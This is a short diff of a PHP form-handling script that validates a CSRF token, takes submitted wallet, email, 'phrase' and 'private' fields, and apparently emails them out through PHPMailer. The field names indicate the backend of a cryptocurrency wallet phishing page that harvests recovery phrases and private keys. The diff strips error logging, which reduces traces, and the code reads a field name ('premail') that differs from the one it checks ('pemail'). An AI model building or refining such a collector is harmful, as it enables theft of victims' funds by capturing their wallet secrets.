@@ -29,7 +29,6 @@ if (!isset($_SESSION['csrf_token'])) {
 }
 
 if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-    error_log("CSRF failed");
     if ($isAjax) {
         http_response_code(403);
         echo json_encode(['error' => 'Invalid CSRF Token']);
@@ -69,7 +68,6 @@ if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
     $email = trim($_POST['premail']);
     $data = trim($_POST['private']);
 } else {
-    error_log("Invalid submission type");
     if ($isAjax) {
         http_response_code(400);
         echo json_encode(['error' => 'Invalid Submission']);
@@ -82,7 +80,6 @@ if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
 }
 
 if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    error_log("Validation failed");
     if ($isAjax) {
         http_response_code(400);
         echo json_encode(['error' => 'Invalid Input']);
@@ -171,9 +168,6 @@ try {
     }
     exit;
 }
-
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
 
 if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
     error_log("PHPMailer not found in " . __FILE__);
